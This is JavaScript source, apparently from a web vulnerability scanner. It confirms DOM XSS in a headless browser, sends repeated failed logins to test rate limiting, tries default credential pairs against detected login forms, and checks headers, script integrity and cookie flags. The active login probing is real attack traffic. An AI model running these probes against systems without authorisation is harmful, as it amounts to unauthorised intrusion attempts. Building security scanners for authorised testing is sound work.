  // ---------- DOM XSS headless-browser verification (active mode only) ----------
  if (mode === "active" && domCandidates.length) {
    try {
      const { verifyDomXss, closeDomXss } = await import("./domxss.js");
      log(`[${t0()}s] [A03] Verifying ${domCandidates.length} DOM-XSS candidate(s) in headless Chromium...`);
      const confirmed = await verifyDomXss(domCandidates, (m) => log(`[${t0()}s] ${m}`), authCookie);
      await closeDomXss();
      for (const hit of confirmed) {
        findings.push(finding({
          title: `DOM-based XSS CONFIRMED — script executed in browser (${hit.param})`,
          severity: "critical", category: "xss", owasp: "A03:2021 Injection",
          description: `Headless Chromium executed injected JavaScript via parameter '${hit.param}' — window marker set and alert() dialog fired. This is a proven, exploitable DOM XSS.`,
          endpoint: hit.url.split("?")[0],
          parameter: hit.param,
          vector: "dom-xss",
          payload: hit.payload,
          evidence: `Headless browser navigated to ${hit.url} → window.__CYBERHUNTER_XSS === 1 (script executed); alert(1) payload included for popup proof`,
          exploit: "Attacker sends victim a crafted link; the page's own JS writes the payload into the DOM → arbitrary JavaScript runs in the victim's session (cookie theft, actions as the user).",
          recommendation: "Never pass location/hash/URL data to DOM sinks; use textContent instead of innerHTML/document.write; sanitize with DOMPurify.",
        }));
      }
    } catch (e) {
      log(`[${t0()}s] [A03] DOM-XSS browser verification unavailable: ${e.message}`);
    }
  }

  // ---------- A03: API & JSON body surface (active mode) ----------
  if (mode === "active") {
    try {
      await scanApiSurface({ pages: crawlData.pages, origin: url.origin, basePath: url.pathname.replace(/[^/]*$/, "") || "/", ftF, authCookie, log, t0, findings, finding });
    } catch (e) {
      log(`[${t0()}s] [A03] API surface check failed: ${e.message}`);
    }
    try {
      await scanPathParams({ pages: crawlData.pages, origin: url.origin, ftF, log, t0, findings, finding });
    } catch (e) {
      log(`[${t0()}s] [A03] Path parameter check failed: ${e.message}`);
    }
    try {
      await scanGraphQL({ pages: crawlData.pages, origin: url.origin, ftF, log, t0, findings, finding });
    } catch (e) {
      log(`[${t0()}s] [A03] GraphQL check failed: ${e.message}`);
    }
    try {
      await scanExposedSecrets(crawlData.pages, url.origin, ftF, log, t0, findings, finding);
    } catch (e) {
      log(`[${t0()}s] [A02] Secret scan failed: ${e.message}`);
    }
    try {
      await scanCveSurface({ pages: crawlData.pages, origin: url.origin, ftF, log, t0, findings, finding, active: mode === "active" });
    } catch (e) {
      log(`[${t0()}s] [CVE] CVE surface scan failed: ${e.message}`);
    }
    try {
      await checkSubdomainTakeover(enumeratedHosts, ftF, log, t0, findings, finding);
    } catch (e) {
      log(`[${t0()}s] [RECON] Takeover check failed: ${e.message}`);
    }
  }

  // ---------- A07: Authentication surface ----------
  log(`[${t0()}s] [A07/A06/A08] Checking auth surface, component disclosure, SRI...`);
  const hasLogin = /type=["']?password/i.test(html) || /login|signin|auth/i.test(url.pathname)
    || crawlData.pages.some((p) => /type=["']?password/i.test(p.html ?? ""));
  if (hasLogin) {
    findings.push(finding({
      title: "Login/authentication form detected", severity: "info", category: "auth", owasp: "A07:2021 Identification and Authentication Failures",
      description: "Target exposes an authentication surface. Manual verification recommended: rate limiting, MFA, password policy, session management.",
      evidence: `Password input or auth path found in ${url.pathname}`,
      payload: "N/A — manual review recommended",
      exploit: "Common auth failures: credential stuffing, brute force, session fixation, missing MFA.",
      recommendation: "Verify rate limiting, MFA, secure session cookies, and password policy.",
    }));
    // active mode: actively verify whether the login endpoint throttles
    if (mode === "active") {
      const loginPage = crawlData.pages.find((p) => /type=["']?password/i.test(p.html ?? ""));
      const loginCandidate =
        auth?.loginUrl ??
        crawlData.forms.find((f) => /login|signin|auth/i.test(f.url))?.url ??
        loginPage?.url ??
        url.toString();
      await checkLoginThrottle(loginCandidate, ftF, log, t0, findings, finding);
      await checkDefaultCredentials(loginCandidate, ftF, log, t0, findings, finding);
    }
  }

  // ---------- A07: login brute-force / rate-limit check ----------
// Sends a handful of failed logins and watches for throttling signals
// (HTTP 429, Retry-After, lockout/captcha messages). No signal → finding.
async function checkLoginThrottle(loginUrl, ftF, log, t0, findings, finding) {
  try {
    const page = await ftF(loginUrl, {}, 8000);
    const html = await page.text();
    const inputs = [...html.matchAll(/<input[^>]*>/gi)].map((m) => m[0]);
    const passInput = inputs.find((t) => /type=["']?password/i.test(t));
    const passName = passInput && /name=["']([^"']+)/i.exec(passInput)?.[1];
    if (!passName) return;
    const userInput = inputs.find((t) => {
      const ty = (/type=["']([^"']+)["']/i.exec(t)?.[1] ?? "text").toLowerCase();
      return !/hidden|submit|button|checkbox|radio|password|file|image|reset/i.test(ty) && /name=["']([^"']+)/i.test(t);
    });
    const userName = userInput && /name=["']([^"']+)/i.exec(userInput)?.[1];
    const submitInput = inputs.find((t) => /type=["']?(submit|button)/i.test(t) && /name=["']([^"']+)/i.test(t));
    const submitField = submitInput ? { [/name=["']([^"']+)/i.exec(submitInput)[1]]: (/value=["']([^"']*)["']/i.exec(submitInput)?.[1] ?? "Login") } : {};

    const formOpen = /<form[^>]*>/i.exec(html)?.[0] ?? "";
    const formMethod = (/method=["']([^"']*)["']/i.exec(formOpen)?.[1] ?? "get").toLowerCase() === "post" ? "POST" : "GET";
    const formAction = /action=["']([^"']*)["']/i.exec(formOpen)?.[1];
    let postUrl = loginUrl;
    try { if (formAction) postUrl = new URL(formAction, loginUrl).toString(); } catch { /* keep */ }
    const hidden = extractHiddenInputs(html);

    const throttleRe = /too many|rate.?limit|locked|try again later|captcha|temporarily blocked|slow down|exceeded/i;
    const codes = new Set();
    let sawThrottle = false;
    for (let i = 0; i < 6; i++) {
      const fields = {
        ...hidden,
        ...submitField,
        ...(userName ? { [userName]: `cyberhunter_probe_${i}` } : {}),
        [passName]: `WrongPass!${i}`,
      };
      let reqUrl = postUrl;
      const init = {};
      if (formMethod === "POST") {
        init.method = "POST";
        init.headers = { "Content-Type": "application/x-www-form-urlencoded" };
        init.body = new URLSearchParams(fields).toString();
      } else {
        const u2 = new URL(postUrl);
        for (const [k, v] of Object.entries(fields)) u2.searchParams.set(k, String(v));
        reqUrl = u2.toString();
      }
      const r = await ftF(reqUrl, init, 8000);
      const text = await r.text().catch(() => "");
      codes.add(r.status);
      if (r.status === 429 || r.headers.get("retry-after") || throttleRe.test(text)) { sawThrottle = true; break; }
    }
    if (!sawThrottle) {
      findings.push(finding({
        title: "No brute-force protection on login endpoint", severity: "medium", category: "auth", owasp: "A07:2021 Identification and Authentication Failures",
        description: `6 consecutive failed login attempts to ${postUrl} produced no throttling — no HTTP 429, Retry-After, lockout, or CAPTCHA. Credential stuffing / password spraying is feasible.`,
        endpoint: postUrl, parameter: passName, vector: "form-post",
        payload: "6x POST with invalid credentials (cyberhunter_probe_*)",
        evidence: `Responses: HTTP ${[...codes].join(", ")}; no rate-limit/lockout signal detected`,
        exploit: "Attacker automates login attempts (e.g. hydra, Burp Intruder) to guess credentials at network speed — no countermeasure slows them down.",
        recommendation: "Implement progressive delays, account lockout, CAPTCHA after N failures, and/or IP-based rate limiting (e.g. fail2ban).",
      }));
      log(`[${t0()}s] [!] No login rate-limiting detected (${[...codes].join(", ")})`);
    } else {
      log(`[${t0()}s] [A07] Login throttling detected — brute-force protection present`);
    }
  } catch { /* non-fatal */ }
}

// ---------- A07: default credentials ----------
// Tries a small list of common credential pairs against the detected login
// form. A guaranteed-wrong baseline POST is sent first so an already
// authenticated session can't produce a false positive.
async function checkDefaultCredentials(loginUrl, ftF, log, t0, findings, finding) {
  try {
    const page = await ftF(loginUrl, {}, 8000);
    const html = await page.text();
    if (process.env.SCAN_DEBUG) console.error(`[dbg-creds] GET ${loginUrl} → ${page.status} ${html.length}b`);
    const inputs = [...html.matchAll(/<input[^>]*>/gi)].map((m) => m[0]);
    const passInput = inputs.find((t) => /type=["']?password/i.test(t));
    const passName = passInput && /name=["']([^"']+)/i.exec(passInput)?.[1];
    if (!passName) { if (process.env.SCAN_DEBUG) console.error("[dbg-creds] no password field"); return; }
    const userInput = inputs.find((t) => {
      const ty = (/type=["']([^"']+)["']/i.exec(t)?.[1] ?? "text").toLowerCase();
      return !/hidden|submit|button|checkbox|radio|password|file|image|reset/i.test(ty) && /name=["']([^"']+)/i.test(t);
    });
    const userName = userInput && /name=["']([^"']+)/i.exec(userInput)?.[1];
    if (!userName) { if (process.env.SCAN_DEBUG) console.error("[dbg-creds] no username field"); return; }
    const submitInput = inputs.find((t) => /type=["']?(submit|button)/i.test(t) && /name=["']([^"']+)/i.test(t));
    const submitField = submitInput ? { [/name=["']([^"']+)/i.exec(submitInput)[1]]: (/value=["']([^"']*)["']/i.exec(submitInput)?.[1] ?? "Login") } : {};
    const formOpen = /<form[^>]*>/i.exec(html)?.[0] ?? "";
    const formMethod = (/method=["']([^"']*)["']/i.exec(formOpen)?.[1] ?? "get").toLowerCase() === "post" ? "POST" : "GET";
    const formAction = /action=["']([^"']*)["']/i.exec(formOpen)?.[1];
    let postUrl = loginUrl;
    try { if (formAction) postUrl = new URL(formAction, loginUrl).toString(); } catch { /* keep */ }
    const hidden = extractHiddenInputs(html);
    if (process.env.SCAN_DEBUG) console.error(`[dbg-creds] user=${userName} pass=${passName} method=${formMethod} postUrl=${postUrl}`);

    // Markers that only appear AFTER a successful login. Compared against the
    // failed-login baseline so an already-authenticated session can't cause
    // false positives.
    const AUTH_OK_RE = /welcome to the|login (was )?successful|successfully logged|you are now logged|dashboard|my account|log\s?-?\s?out|sign\s?-?\s?out|berhasil (login|masuk)|selamat datang/i;

    const attempt = async (u, p) => {
      // Refresh hidden fields (CSRF/user_token) before EVERY attempt — tokens
      // are typically single-use and rotate per GET; a stale token makes even
      // correct credentials fail.
      let hiddenNow = hidden;
      try {
        const fresh = await ftF(loginUrl, {}, 8000);
        hiddenNow = extractHiddenInputs(await fresh.text().catch(() => ""));
      } catch { /* reuse stale hidden fields */ }
      const fields = {
        ...hiddenNow, ...submitField,
        [userName]: u, [passName]: p,
      };
      let reqUrl = postUrl;
      const init = {};
      if (formMethod === "POST") {
        init.method = "POST";
        init.headers = { "Content-Type": "application/x-www-form-urlencoded" };
        init.body = new URLSearchParams(fields).toString();
      } else {
        // GET forms submit credentials in the query string — a POST body would
        // be ignored entirely (e.g. DVWA brute-force reads $_GET).
        const u2 = new URL(postUrl);
        for (const [k, v] of Object.entries(fields)) u2.searchParams.set(k, String(v));
        reqUrl = u2.toString();
      }
      const r = await ftF(reqUrl, init, 8000);
      const text = await r.text().catch(() => "");
      return {
        status: r.status,
        final: r.finalUrl ?? r.url ?? "",
        authed: AUTH_OK_RE.test(text),
      };
    };

    // Baseline: guaranteed-invalid creds → signature of a FAILED login attempt.
    const base = await attempt(`cyberhunter_invalid_${Date.now()}`, "WrongPass!xyz");
    if (process.env.SCAN_DEBUG) console.error(`[dbg-creds] baseline authed=${base.authed} status=${base.status} final=${base.final}`);

    for (const [u, p] of DEFAULT_CRED_PAIRS) {
      const r = await attempt(u, p);
      if (process.env.SCAN_DEBUG) console.error(`[dbg-creds] try ${u}:${p} → authed=${r.authed} status=${r.status} final=${r.final}`);
      // Success = authenticated-marker response that the failed baseline lacks
      if (r.authed && !base.authed) {
        findings.push(finding({
          title: `Default credentials accepted ('${u}')`, severity: "high", category: "auth", owasp: "A07:2021 Identification and Authentication Failures",
          description: `Login at ${postUrl} accepted the common credential pair '${u}' / '${p}' — the application ships with guessable default credentials.`,
          endpoint: postUrl, parameter: userName, vector: formMethod === "POST" ? "form-post" : "form-get",
          payload: `${userName}=${u}&${passName}=${p}`,
          evidence: `${formMethod} ${postUrl} → HTTP ${r.status}, final URL ${r.final}; response shows post-login markers absent from the failed-login baseline`,
          exploit: "Anyone can log in with publicly known default credentials — full account takeover without any attack tooling.",
          recommendation: "Force password change on first login, remove default accounts, and alert on login with known-default credentials.",
        }));
        log(`[${t0()}s] [!] Default credentials accepted: '${u}'/'${p}' @ ${postUrl}`);
        return;
      }
    }
    log(`[${t0()}s] [A07] Default credential check: no common pairs accepted (${DEFAULT_CRED_PAIRS.length} tried)`);
  } catch (e) { if (process.env.SCAN_DEBUG) console.error("[dbg-creds] error:", e); }
}

// ---------- A06: Software/version disclosure ----------
  const poweredBy = headers.get("x-powered-by");
  const server = headers.get("server");
  if (poweredBy || server) {
    findings.push(finding({
      title: "Technology/version disclosure", severity: "low", category: "components", owasp: "A06:2021 Vulnerable and Outdated Components",
      description: "Server headers reveal software stack that can be matched against known CVEs.",
      evidence: [server && `server: ${server}`, poweredBy && `x-powered-by: ${poweredBy}`].filter(Boolean).join(" | "),
      payload: "N/A — passive observation",
      exploit: "Attacker fingerprints the stack (e.g. 'Apache 2.4.49') and looks up public exploits/CVEs for that exact version.",
      recommendation: "Remove version banners; keep components patched; run dependency scanning.",
    }));
  }

  // ---------- A08: Subresource Integrity (across crawled pages) ----------
  const sriMissing = new Set();
  for (const p of crawlData.pages.slice(0, 10)) {
    for (const m of p.html.matchAll(/<script[^>]+src=["'](https?:\/\/[^"']+)["'][^>]*>/gi)) {
      if (!/integrity=/i.test(m[0])) sriMissing.add(m[1]);
    }
  }
  if (sriMissing.size) {
    findings.push(finding({
      title: "External scripts loaded without Subresource Integrity", severity: "low", category: "integrity", owasp: "A08:2021 Software and Data Integrity Failures",
      description: `${sriMissing.size} external <script> URL(s) lack an integrity attribute across crawled pages.`,
      evidence: [...sriMissing].slice(0, 5).join("\n"),
      payload: "N/A — passive observation",
      exploit: "If the CDN/third-party host is compromised, attacker-modified JS executes in your pages (supply-chain attack).",
      recommendation: "Add integrity=\"sha384-...\" + crossorigin to third-party scripts.",
    }));
  }

  // ---------- A01/A07: Cookie flags ----------
  const allCookies = new Set();
  for (const p of crawlData.pages) {
    for (const c of p.res?.headers.getSetCookie?.() ?? []) allCookies.add(c);
  }
  for (const c of [...allCookies].slice(0, 10)) {
    const name = c.split("=")[0];
    const issues = [];
    if (!/secure/i.test(c)) issues.push("missing Secure");
    if (!/httponly/i.test(c)) issues.push("missing HttpOnly");
    if (!/samesite/i.test(c)) issues.push("missing SameSite");
    if (issues.length) {
      findings.push(finding({
        title: `Cookie '${name}' weak flags`, severity: "medium", category: "cookies", owasp: "A07:2021 Identification and Authentication Failures",
        description: `Session cookie lacks: ${issues.join(", ")}.`,
        evidence: c.slice(0, 300),
        payload: "N/A — passive observation",
        exploit: "Missing Secure → cookie sent over HTTP (sniffable). Missing HttpOnly → stolen via XSS. Missing SameSite → CSRF.",
        recommendation: "Set Secure, HttpOnly, SameSite=Lax/Strict on session cookies.",
      }));
    }
  }

  log(`[${t0()}s] Scan complete — ${findings.length} findings`);
  const elapsed = Date.now() - started;
  const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  findings.sort((a, b) => (order[a.severity] ?? 9) - (order[b.severity] ?? 9));

  const count = (s) => findings.filter((f) => f.severity === s).length;
  return {
    ok: true,
    mode,
    authenticated: !!authCookie,
    target: url.toString(),
    status: res.status,
    elapsed_ms: elapsed,
    pages_crawled: crawlData.pages.filter((p) => !p.asset).length,
    params_tested: [...testedParams],
    findings,
    summary: {
      total: findings.length,
      critical: count("critical"), high: count("high"), medium: count("medium"),
      low: count("low"), info: count("info"),
    },
  };
}
